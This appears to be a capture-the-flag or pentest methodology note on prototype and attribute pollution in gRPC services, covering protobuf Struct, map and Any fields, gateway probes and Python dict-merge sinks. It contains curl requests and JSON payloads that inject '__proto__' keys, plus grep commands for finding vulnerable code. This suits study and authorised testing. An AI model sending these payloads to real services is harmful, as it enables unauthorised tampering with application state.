# gRPC / protobuf attribute pollution — the structured-data variant

Protobuf messages don't carry `__proto__` — the wire format has no
prototype concept. But gRPC services that convert protobuf→plain-
object and then merge/process it re-enter the same class through
the JSON-representation field names and the `oneof`/`Any` fields.

---

## 1. The conversion surface

```js
// grpc server-side
const obj = call.request.toObject();          // protobuf → plain obj
merge(config, obj);                           // the merge is back
// or a REST gateway (grpc-gateway / grpc-web) translating JSON→proto
POST /api.Service/Method {"field":{"__proto__":{"m":1}}}
// the gateway builds the proto message; then server code does
// obj.toObject() → merge → pollution via the JSON carrier again
```

The write carrier is the gateway's JSON translation or the
`toObject()` output — the field names come from the `.proto` schema,
but a NESTED message's fields can carry a `__proto__` key if the
schema has a `map<string, Value>` or a `google.protobuf.Struct`.

## 2. The `google.protobuf.Struct` carrier — the open JSON type

```protobuf
message UpdateReq {
  google.protobuf.Struct config = 1;   // an arbitrary-JSON field!
}
```

`google.protobuf.Struct` is the protobuf "any JSON" type — it holds
arbitrary nested JSON. `config.toObject()` returns a plain object —
with whatever keys the wire carried, INCLUDING `"__proto__"`.

```bash
curl -X POST "$BASE/api.Service/Update" \
  -H 'Content-Type: application/json' \
  -d '{"config":{"__proto__":{"m":1}}}'
# the Struct field carries it; toObject() produces a plain object
# with a literal '__proto__' own-key; the merge sees it
```

`Struct`/`Value`/`ListValue` are the proto types that lose type
safety — they round-trip arbitrary JSON.

## 3. The `map<string, T>` carrier

```protobuf
message UpdateReq {
  map<string, string> attrs = 1;
  map<string, google.protobuf.Value> data = 2;
}
```

A `map<string, ...>` field's keys are arbitrary strings — a
`"__proto__"` KEY survives into the converted object:

```json
{"attrs": {"__proto__": "x"}}
{"data": {"__proto__": {"kind": {"number_value": 1}}}}
{"data": {"__proto__.m": {"kind": {"number_value": 1}}}}
{"attrs": {"__proto__.m": "1"}}
```

`map.toObject()` produces `{attrs: {"__proto__": "x"}}` — a literal
own-key — mergeable.

## 4. The `Any` type — the typed-URL carrier

```protobuf
message Req { google.protobuf.Any payload = 1; }
```

`google.protobuf.Any` packs an arbitrary message — `{type_url, value}`.
A JSON gateway unpacks it into a nested object — if a merge walks
it, the nested fields carry their own keys.

## 5. The oneof / field-name confusion

```protobuf
message Req { oneof choice { A a = 1; B b = 2; } }
```

`oneof` resolution reads field NAMES — the conversion emits the
chosen field's name; a request shaping the JSON with unexpected
key names can produce objects whose keys feed a `set(path, v)`.

## 6. The JSON-name vs proto-name differential

```protobuf
message Req { string user_name = 1 [json_name="userName"]; }
```

Two names for one field — `user_name` on the wire, `userName` in
JSON. A merge that keys on the JSON name but a sink reading the
proto name can produce differential confusion; more relevantly,
`__proto__` has NO json_name — it always carries the literal.

## 7. The grpc-web / gateway probes

```bash
# grpc-web JSON bridge
curl -X POST "$BASE/api.Service/Method" \
  -H 'Content-Type: application/grpc-web+proto' \
  -H 'X-Grpc-Web: 1' \
  -d '<binary>'

# grpc-gateway REST→gRPC
curl -X POST "$BASE/v1/resource" \
  -H 'Content-Type: application/json' \
  -d '{"config":{"__proto__":{"m":1}}}'

# the Struct-shaped field
{"payload":{"@type":"type.googleapis.com/google.protobuf.Struct","value":{"__proto__":{"m":1}}}}
```

## 8. Python gRPC — the `MessageToDict`/`MessageToJson` path

```python
from google.protobuf.json_format import MessageToDict
d = MessageToDict(req)                # proto → dict — plain dict!
setattr_loop(cfg, d)                  # the setattr-merge again
config.update(d)                      # dict.update — the py carrier
cfg.__dict__.update(d)
merge(cfg, d)                          # the recursive merge
```

`MessageToDict`/`MessageToJson`/`ParseDict` are the conversion
functions — a `Struct`/`map`/`Any` field's `__proto__`/`__class__`
keys land in a plain dict — the Python merge sinks take over.

## 9. The `Message.DESCRIPTOR` escape

```python
# a proto field name that's also a python magic attr
req.__class__         # the message class — shared root!
req.DESCRIPTOR        # the message descriptor — shared schema!
# setattr(req, '__class__', X) — can't reclass a proto message
# but setattr on the DESCRIPTOR is a schema-level write
setattr(req.DESCRIPTOR, 'name', 'x')   # proto-meta write
```

Python proto objects are managed C-types — `__class__` reclassing
fails, but `DESCRIPTOR`-level and `__dict__`-adjacent writes on the
PYTHON-side wrapper objects can still pollute.

## 10. The Thrift/Avro variants

```python
# thrift TDeserializer → thrift object → .__dict__ → merge
# avro DatumReader → dict → merge
# same pattern: a wire type → a plain dict → a merge → pollution
# the keys are schema-bound EXCEPT for map<K,V> and Any-ish fields
```

## 11. Detection — is there a structured-data conversion?

```bash
# the conversion functions in source
grep -rnE 'toObject|MessageToDict|MessageToJson|ParseDict|json_format|\.to_dict|vars\(|__dict__|asdict|toJSON' \
  <src> | grep -v node_modules | head -40

# the Struct/map/Any types in protos
grep -rnE 'google\.protobuf\.(Struct|Value|Any|ListValue|Empty)|map<' \
  <protos> | head -40
```

A `.proto` with `Struct`/`Any`/`map` fields + a `toObject`-equivalent
+ a `merge`/`setattr`/`update` downstream = the class applies.

## 12. The ledger

```bash
python3 tools/state.py <chal> --hypothesis \
  "grpc Struct field -> toObject -> merge -> pp"
# refutes when: no Struct/map/Any fields; or toObject output is
# never merged; or the merge is key-filtered; or the sink never
# reads a fallback for the writable names
```
